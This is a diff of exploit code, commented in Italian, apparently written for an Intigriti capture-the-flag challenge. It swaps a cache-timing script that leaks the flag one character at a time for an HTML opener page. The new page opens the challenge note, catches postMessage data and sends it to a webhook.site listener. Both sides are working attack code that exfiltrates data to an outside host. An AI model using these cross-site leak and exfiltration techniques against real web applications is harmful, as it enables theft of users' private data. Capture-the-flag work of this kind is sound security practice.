@@ -1,96 +1,76 @@
-// --- Configuration ---
-const CHALLENGE_BASE_URL = "https://challenge-0325.intigriti.io"; // <-- USA QUESTO PER IL TARGET REMOTO
-// const CHALLENGE_BASE_URL = "http://localhost"; // <-- USA QUESTO SE TESTI LOCALMENTE (e risolvi mixed content)
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit Page</title>
+</head>
+<body>
+    <h1>Opener Page</h1>
+    <p>Questa pagina aprirà la challenge e attenderà un messaggio...</p>
+    <p id="status">Status: In attesa...</p>
+    <p>Controlla il tuo webhook: <a id="webhookLink" href="#" target="_blank">Webhook</a></p>
 
-const NOTE_ID = "17953759-897b-44d9-99ac-baeb25913ba5";
-const ATTACKER_LISTENER_URL = "https://webhook.site/c93aa80e-2711-477d-9419-9cd835344dff";
-const KNOWN_FLAG_PREFIX = "INTIGRITI{";
-const possibleChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!}";
-const FLAG_END_CHAR = '}';
-const MAX_FLAG_LENGTH = 70;
+    <script>
+        const webhookUrl = "https://webhook.site/49ab0b49-c1a8-4333-a9e0-1e6aec41edcd"; // Il tuo webhook
+        document.getElementById('webhookLink').href = webhookUrl.replace('/?', '/#!/').split('/?')[0]; // Link funzionante per vedere il webhook
 
-// --- Timing Parameters (RIDOTTI DRASTICAMENTE) ---
-const NUM_SAMPLES = 1; // Riduci a 1 per velocità massima
-const PRIMING_TIMEOUT = 2500; // Riduci timeout (ms)
-const MEASUREMENT_TIMEOUT = 2500; // Riduci timeout (ms)
-const DELAY_BETWEEN_PHASES = 50; // Riduci ritardi
-const DELAY_BETWEEN_SAMPLES = 20; // Riduci ritardi (anche se con NUM_SAMPLES=1 non ha effetto)
+        // !!! METTI QUI L'ID DELLA NOTA CHE HAI CREATO NEL PASSO A !!!
+        const notePayloadId = "5785583d-3890-4959-b1e0-d214d2fc3d2b"; // Esempio ID, SOSTITUISCI!
 
+        // URL della challenge che triggera il redirect e l'observer
+        const targetUrl = `https://challenge-0325.intigriti.io/view_protected_note?id=${notePayloadId}`;
 
-// --- State ---
-let leakedFlag = KNOWN_FLAG_PREFIX;
-const statusDiv = document.getElementById('status');
+        const statusElement = document.getElementById('status');
 
-// --- Helper Functions ---
-function log(message, type = 'info') {
-    // ... (invariato)
-}
+        statusElement.textContent = 'Status: Tentativo di aprire la finestra target...';
+        console.log('Opening target URL:', targetUrl);
 
-function sendLeak(data) {
-    // Aggiungi log URL esatto e catch
-    const url = `${ATTACKER_LISTENER_URL}?leak=${encodeURIComponent(data)}`;
-    log(`Sending leak to: ${url}`, 'info'); // Logga l'URL esatto
-    fetch(url, { mode: 'no-cors' })
-        .then(() => log(`Fetch initiated for: ${data}`, 'info'))
-        .catch(err => log(`Fetch failed to initiate for ${data}: ${err}`, 'error'));
-}
+        // Apri la pagina della challenge in una nuova finestra/tab
+        // Il riferimento 'victimWindow' potrebbe essere bloccato da alcuni browser
+        const victimWindow = window.open(targetUrl, '_blank');
 
-// ... (sleep, calculateAverage invariati) ...
-
-function measureTimingAfterPriming() {
-    return new Promise(async (resolve, reject) => {
-        // ... (variabili e cleanup invariati) ...
-
-        try {
-            // --- Phase 1: Prime Cache ---
-            log("Phase 1: Priming cache...");
-            iframe1 = document.createElement('iframe');
-            // ... (stile invariato) ...
-
-            const phase1Promise = new Promise((resolvePhase1, rejectPhase1) => {
-                // ... (onload/onerror invariati) ...
-
-                // !!! URL ASSOLUTO !!!
-                iframe1.src = `${CHALLENGE_BASE_URL}/note/${NOTE_ID}`;
-                document.body.appendChild(iframe1);
-
-                // ... (timeout invariato) ...
-            });
-
-            await phase1Promise;
-            clearTimeout(phase1Timeout);
-            await sleep(DELAY_BETWEEN_PHASES);
-
-            // --- Phase 2: Measure Time ---
-            log("Phase 2: Measuring load time...");
-            startTime = performance.now();
-            iframe2 = document.createElement('iframe');
-            // ... (stile invariato) ...
-
-            const phase2Promise = new Promise((resolvePhase2, rejectPhase2) => {
-                 // ... (onload/onerror invariati) ...
-
-                 // !!! URL ASSOLUTO !!!
-                iframe2.src = `${CHALLENGE_BASE_URL}/note/${NOTE_ID}?s=true`;
-                document.body.appendChild(iframe2);
-
-                // ... (timeout invariato) ...
-            });
-
-            const duration = await phase2Promise;
-            cleanup();
-            resolve(duration);
-
-        } catch (error) {
-            // ... (invariato) ...
+        if (victimWindow) {
+            statusElement.textContent = 'Status: Finestra target aperta (o popup bloccato?). In ascolto di messaggi...';
+            console.log('Window opened (or blocked). Listening for messages...');
+        } else {
+            statusElement.textContent = 'Status: Popup probabilmente bloccato. Impossibile procedere.';
+            console.error('window.open returned null or undefined. Popup blocker?');
         }
-    });
-}
 
-// ... (findCharWithDistinctTiming invariato) ...
+        // Listener per i messaggi dalla finestra aperta
+        window.addEventListener('message', (event) => {
+            console.log('Message received:', event);
 
-// --- Main Leak Logic ---
-// ... (invariato, ma ora userà i parametri ridotti e URL assoluti) ...
+            // Verifica di sicurezza MOLTO importante: controlla l'origine del messaggio!
+            // Deve provenire dal dominio della challenge.
+            if (event.origin !== "https://challenge-0325.intigriti.io") {
+                console.warn(`Message received from unexpected origin: ${event.origin}. Ignored.`);
+                statusElement.textContent = `Status: Messaggio ricevuto da origine errata: ${event.origin}`;
+                return;
+            }
 
-// --- Start ---
-window.onload = startLeak;
+            const leakedData = event.data;
+            console.log('Data received via postMessage:', leakedData);
+            statusElement.textContent = `Status: Dati ricevuti! ${leakedData.substring(0, 50)}... Invio al webhook...`;
+
+            // Invia i dati ricevuti al webhook
+            const leakUrl = `${webhookUrl}/?postMessage_leak=${encodeURIComponent(leakedData)}`;
+            console.log('Sending data to webhook:', leakUrl);
+
+            // Usa fetch con no-cors o new Image() per inviare i dati
+            fetch(leakUrl, { mode: 'no-cors' })
+                .then(() => {
+                    console.log('Webhook request sent (fetch).');
+                    statusElement.textContent = `Status: Dati inviati al webhook! Controllalo.`;
+                })
+                .catch(err => {
+                    console.error('Webhook fetch failed:', err);
+                    // Fallback con immagine
+                    new Image().src = leakUrl;
+                    statusElement.textContent = `Status: Dati inviati al webhook (img fallback)! Controllalo.`;
+                });
+
+        }, false);
+
+    </script>
+</body>
+</html>
